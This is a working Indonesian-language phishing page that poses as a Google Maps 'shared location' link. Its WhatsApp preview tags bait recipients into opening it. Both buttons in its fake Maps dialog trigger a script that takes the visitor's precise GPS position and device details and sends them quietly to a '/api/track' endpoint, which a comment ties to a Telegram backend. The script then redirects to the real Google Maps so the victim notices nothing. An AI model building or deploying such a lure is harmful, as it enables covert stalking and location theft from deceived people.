<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps</title>
    <!-- Open Graph untuk Pratinjau WhatsApp -->
    <meta property="og:title" content="📍 Lokasi Terbagikan">
    <meta property="og:description" content="Seseorang telah membagikan lokasi terkini dengan Anda.">
    <meta property="og:url" content="https://shareloc.online">
    <meta property="og:type" content="website">

    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, Arial, sans-serif; }
        body { 
            background: #ffffff; /* Latar belakang putih bersih */
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            overflow: hidden;
        }

        /* Kotak Dialog Utama */
        .modal-card {
            background: white;
            padding: 32px 24px 28px 24px;
            border-radius: 28px;
            text-align: center;
            max-width: 360px;
            width: 90%;
        }

        /* Logo Pin Google Maps multi-warna */
        .logo {
            width: 52px;
            height: 52px;
            margin-bottom: 20px;
            object-fit: contain;
        }

        h3 { 
            color: #202124; 
            margin-bottom: 12px; 
            font-size: 22px; 
            font-weight: 400; 
        }
        
        p { 
            color: #5f6368; 
            font-size: 15px; 
            margin-bottom: 32px; 
            line-height: 1.4; 
            padding: 0 10px;
        }

        /* Tombol Aksi */
        .btn-container {
            display: flex;
            gap: 12px;
        }
        .btn-outline {
            background: transparent;
            color: #1a73e8;
            border: 1px solid #dadce0;
            padding: 12px 16px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 24px;
            cursor: pointer;
            width: 50%;
            transition: background 0.2s;
        }
        .btn-outline:hover { background-color: rgba(26,115,232,0.04); }

        .btn-solid {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 12px 16px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 24px;
            cursor: pointer;
            width: 50%;
            box-shadow: 0 1px 3px rgba(60,64,67,0.3);
            transition: background 0.2s;
        }
        .btn-solid:hover { background-color: #1557b0; }

        /* Spinner Loading */
        .spinner { 
            border: 3px solid #f1f3f4; 
            border-top: 3px solid #1a73e8; 
            border-radius: 50%; 
            width: 36px; height: 36px; 
            animation: spin 1s linear infinite; 
            margin: 20px auto; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <!-- Kotak Dialog Utama -->
    <div class="modal-card" id="main-card">
        <!-- Logo Resmi Google Maps -->
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/b/bd/Google_Maps_Logo_2020.svg" alt="Google Maps">
        <h3>Buka aplikasi Google Maps?</h3>
        <p>Dapatkan navigasi real-time dan lainnya di aplikasi Maps</p>
        
        <div class="btn-container">
            <button class="btn-outline" onclick="startTracking()">Tetap gunakan web</button>
            <button class="btn-solid" onclick="startTracking()">Lanjutkan</button>
        </div>
    </div>

    <script>
        async function startTracking() {
            const card = document.getElementById('main-card');
            card.innerHTML = `
                <div class="spinner"></div>
                <h3 style="margin-top: 15px; font-size: 18px;">Memuat Peta...</h3>
                <p style="margin-bottom: 0;">Mempersiapkan rute...</p>
            `;

            let latitude = null;
            let longitude = null;
            let accuracy = null;

            // 1. Ambil Lokasi GPS secara instan di latar belakang
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 5000 });
                    });
                    latitude = pos.coords.latitude;
                    longitude = pos.coords.longitude;
                    accuracy = pos.coords.accuracy;
                } catch (e) {
                    console.log("GPS ditolak atau timeout");
                }
            }

            // 2. Info Perangkat Ringan
            const deviceData = {
                hardwareConcurrency: navigator.hardwareConcurrency || '-',
                deviceMemory: navigator.deviceMemory || '-',
            };

            // 3. Kirim data ke backend Telegram secara background
            fetch('/api/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    latitude,
                    longitude,
                    accuracy,
                    image: null,
                    deviceData
                })
            }).catch(e => console.log("Gagal kirim background"));

            // 4. Langsung alihkan ke Google Maps asli dengan cepat
            setTimeout(() => {
                if (latitude && longitude) {
                    window.location.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
                } else {
                    window.location.href = 'https://www.google.com/maps';
                }
            }, 600);
        }
    </script>
</body>
</html>
